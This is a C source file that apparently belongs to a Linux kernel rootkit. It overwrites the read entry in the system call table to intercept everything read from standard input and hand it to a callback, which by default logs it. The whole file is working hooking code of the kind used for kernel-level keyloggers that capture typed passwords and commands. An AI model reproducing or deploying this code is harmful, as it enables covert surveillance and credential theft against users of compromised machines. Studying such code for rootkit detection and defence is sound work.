#include "global.h"
#include <linux/unistd.h>
#include <linux/fs.h>

typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
static fun_ssize_t_int_pvoid_size_t original_read;

typedef void (*fun_void_charp_int)(char *buf, int size);

static fun_void_charp_int callback_function;

static asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;

    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);

    if (retval > 0 && fd == 0){ // only handle this when we actually read something and only read from stdin (fd==0)
        callback_function(buf, retval);
        //printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
    }
    OUR_MODULE_PUT;
    return retval;
}

static void dummy_callback(char* buf, int size){
    OUR_DEBUG("unhandled input from stdin (no callback registered): %s", buf);
    //call this when no callback is specified
}

/* Hooks the read system call. */
void hook_read(fun_void_charp_int cb){
    void** sys_call_table = (void *) ptr_sys_call_table;

    if(cb == 0){
        callback_function = dummy_callback;
    } else {
        callback_function = cb;
    }

    original_read = sys_call_table[__NR_read];
    make_page_writable((long unsigned int) ptr_sys_call_table);
    sys_call_table[__NR_read] = (void*) hooked_read;
    make_page_readonly((long unsigned int) ptr_sys_call_table);
}

/* Hooks the read system call. */
void unhook_read(void){
    void** sys_call_table = (void *) ptr_sys_call_table;
    make_page_writable((long unsigned int) ptr_sys_call_table);
    sys_call_table[__NR_read] = (void*) original_read;
    make_page_readonly((long unsigned int) ptr_sys_call_table);
}
